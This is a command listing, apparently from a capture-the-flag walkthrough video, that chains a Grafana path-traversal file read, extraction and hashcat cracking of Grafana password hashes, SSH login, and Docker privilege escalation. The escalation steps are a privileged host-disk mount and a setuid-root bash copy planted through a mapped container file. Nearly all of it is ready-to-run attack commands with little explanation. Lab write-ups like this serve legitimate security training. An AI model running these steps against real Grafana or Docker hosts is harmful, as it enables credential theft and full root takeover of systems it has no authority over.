# These commands were used in this walkthrough: https://youtu.be/nwoxia9Gcuk (Grafana → Docker → Root)

```bash
#############################################
# 1️⃣ Initial Exploitation: Grafana LFI
#############################################

# Read /etc/passwd via path traversal in Grafana
curl --path-as-is 'http://IP:3000/public/plugins/alertlist/../../../../../../../../etc/passwd'

# Dump the Grafana database (contains user hashes)
curl --path-as-is 'http://IP:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db' -o ./grafana.db

#############################################
# 2️⃣ Extract & Crack Grafana Hashes
#############################################

# Use this tool to extract and convert Grafana hashes:
# https://github.com/iamaldi/grafana2hashcat

python3 grafana2hashcat.py ./grafana.db -o ./hashcat_hashes.txt

# Crack the hashes using Hashcat (mode 10900 = bcrypt), hash,salt
hashcat -m 10900 hashcat_hashes.txt --wordlist /usr/share/wordlists/rockyou.txt


#############################################
# 3️⃣ Access the Host via SSH
#############################################

ssh boris@<ip>
# Password: <from cracked hash>

#############################################
# 4️⃣ Privilege Escalation via Docker
#############################################

sudo -l
# => You can run: (root) NOPASSWD: /snap/bin/docker exec *

# ─── Find Container ID ─────────────────────────────────────────────────────

# Option 1: Try listing containers (if allowed)
docker ps

# Option 2: Check local Docker metadata
ls /var/snap/docker/common/var-lib-docker/containers/

# Option 3: Look for running containerd shims
ps aux | grep containerd-shim


# ─── Enter the Container as Root ───────────────────────────────────────────

sudo /snap/bin/docker exec -it -u root <container_id> /bin/bash


# ─── Method 1: Escape via /dev mount ───────────────────────────────────────

sudo docker exec -u root --privileged e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 mkdir /mnt/host

sudo docker exec -u root --privileged e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 mount /dev/sda1 /mnt/host

sudo docker exec -u root --privileged -it e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 /bin/bash
ls /mnt/host


# ─── Method 2: Overwrite Host File via Mapped Volume ───────────────────────

# Step 1 (host - unprivileged user):
cat /var/snap/docker/common/var-lib-docker/containers/<container_id>/hostname
# → confirm that it's writable and mapped to host (in our case, we had no access but that's okay)

# Step 2 (inside container - as root):
chmod 777 /etc/hostname

# Step 3 (back on host):
cat /bin/bash > /var/snap/docker/common/var-lib-docker/containers/<container_id>/hostname

# Step 4 (inside container):
chown root:root /etc/hostname
chmod 4755 /etc/hostname  # make it setuid root

# Step 5 (host - unprivileged user):
/var/snap/docker/common/var-lib-docker/containers/<container_id>/hostname -p
# → You now can read root dir or add your pub ssh_key.
```
